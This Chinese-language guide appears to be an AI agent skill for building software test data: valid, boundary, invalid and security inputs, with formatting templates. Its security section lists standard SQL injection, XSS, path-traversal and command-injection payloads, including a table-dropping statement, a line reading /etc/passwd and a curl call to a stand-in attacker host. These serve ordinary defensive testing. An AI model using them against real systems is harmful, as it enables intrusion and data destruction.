# 测试数据构造 Skill

## 激活场景
- 设计测试用例时需要构造测试数据
- 需要准备数据驱动的测试集
- 需要构造边界值/异常值数据
- 需要构造安全测试 Payload

---

## 数据分类

### 1. 有效数据（Valid Data）

**定义**：符合业务规则的正常输入数据

**特点**：
- 满足所有校验规则
- 能正常通过系统处理
- 产生预期的正常结果

**示例**：
```
用户名：zhangsan_123
手机号：13800138000
邮箱：zhangsan@example.com
日期：2024-01-15
金额：100.00
```

### 2. 边界数据（Boundary Data）

**定义**：处于取值范围边界的数据

**分类**：
| 类型 | 示例（长度6-20） | 示例（数值1-100） |
|------|------------------|-------------------|
| 下边界-1 | 5个字符 | 0 |
| 下边界 | 6个字符 | 1 |
| 下边界+1 | 7个字符 | 2 |
| 上边界-1 | 19个字符 | 99 |
| 上边界 | 20个字符 | 100 |
| 上边界+1 | 21个字符 | 101 |

### 3. 无效数据（Invalid Data）

**定义**：不符合业务规则的异常输入数据

**常见类型**：
```
类型不匹配：
  - 数字字段输入字母
  - 日期字段输入乱码

格式错误：
  - 手机号：138001（少位）
  - 邮箱：invalid-email
  - 身份证号：错误的校验位

逻辑错误：
  - 结束日期早于开始日期
  - 负数金额
  - 超过可用库存的购买数量
```

### 4. 安全数据（Security Payloads）

**定义**：用于安全测试的攻击性数据

#### SQL 注入
```
' OR '1'='1
' OR 1=1--
'; DROP TABLE users; --
1' AND 1=1--
1' AND 1=2--
```

#### XSS 攻击
```
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
javascript:alert('XSS')
```

#### 命令注入
```
; cat /etc/passwd
| whoami
`ping -c 1 attacker.com`
$(curl http://attacker.com)
```

#### 路径遍历
```
../../../etc/passwd
..\\..\\..\\windows\\system32\\config\\sam
```

#### 特殊字符
```
Null字符：%00
换行符：\n, \r\n
超长字符串：重复字符10000次
Unicode异常：\u0000, \uffff
```

## 数据构造原则

### 1. 真实性
- 尽可能使用接近真实业务的数据
- 避免明显的假数据（如 "test", "123456"）

### 2. 具体性
```
❌ 不合格：用户名：有效用户名
✅ 合格：用户名：zhangsan_2024

❌ 不合格：金额：大于0的数字
✅ 合格：金额：199.99
```

### 3. 可追溯性
```
数据命名包含用途标识：
- username_valid_01      → 有效数据01
- username_boundary_min  → 边界最小值
- username_invalid_null  → 无效-空值
- username_sql_inject    → SQL注入测试
```

### 4. 组合性
```
复杂场景需要组合多字段数据：

场景：新用户注册
{
  "username": "newuser_001",
  "password": "Test@123456",
  "email": "newuser001@test.com",
  "phone": "13800138001",
  "birthdate": "1995-06-15",
  "id_card": "110101199506151234"
}
```

## 常用测试数据集

### 用户认证
| 数据项 | 有效数据 | 边界数据 | 无效数据 | 安全数据 |
|--------|----------|----------|----------|----------|
| 用户名 | zhangsan | a(1字符) | 空值 | `<script>alert(1)</script>` |
| 密码 | Test@123 | 123456(弱) | 纯数字 | `' OR '1'='1` |
| 手机号 | 13800138000 | 1380013800 | 12345678901 | `13800000000<script>` |
| 邮箱 | user@test.com | a@b.c | invalid | `"onmouseover=alert(1)` |

### 金额/价格
| 场景 | 有效数据 | 边界数据 | 无效数据 | 安全数据 |
|------|----------|----------|----------|----------|
| 订单金额 | 199.99 | 0.01 | -100 | `999999999999` |
| 折扣率 | 0.85 | 0.00 | 1.5 | `0.9999999999` |
| 数量 | 10 | 1 | 0 | `2147483648` |

### 日期时间
| 场景 | 有效数据 | 边界数据 | 无效数据 | 安全数据 |
|------|----------|----------|----------|----------|
| 生日 | 1990-05-20 | 1900-01-01 | 2025-01-01 | `0000-00-00` |
| 预约时间 | 2024-06-15 14:30 | 当前时间+1分钟 | 过去时间 | `9999-99-99 99:99` |

## 数据输出格式

### 单字段数据
```markdown
**测试数据**：
- 字段名：[字段名]
- 有效值：[具体值]
- 边界值（最小）：[值]
- 边界值（最大）：[值]
- 无效值：[值1], [值2], [值3]
- 安全测试值：[payload]
```

### 多字段组合
```markdown
**测试数据集**：

| 场景 | 字段1 | 字段2 | 字段3 | 预期结果 |
|------|-------|-------|-------|----------|
| 正常场景 | 值A1 | 值B1 | 值C1 | 成功 |
| 边界场景 | 值A2 | 值B2 | 值C2 | 成功 |
| 异常场景 | 值A3 | 值B3 | 值C3 | 失败-提示X |
```

### JSON 格式
```json
{
  "test_data_set": {
    "name": "用户注册测试数据",
    "cases": [
      {
        "id": "TD-001",
        "type": "valid",
        "data": {
          "username": "zhangsan_001",
          "password": "Test@123456",
          "email": "zhangsan@test.com"
        },
        "expected": "注册成功"
      },
      {
        "id": "TD-002",
        "type": "boundary",
        "data": {
          "username": "a",
          "password": "123456",
          "email": "a@b.c"
        },
        "expected": "校验失败-用户名太短"
      }
    ]
  }
}
```
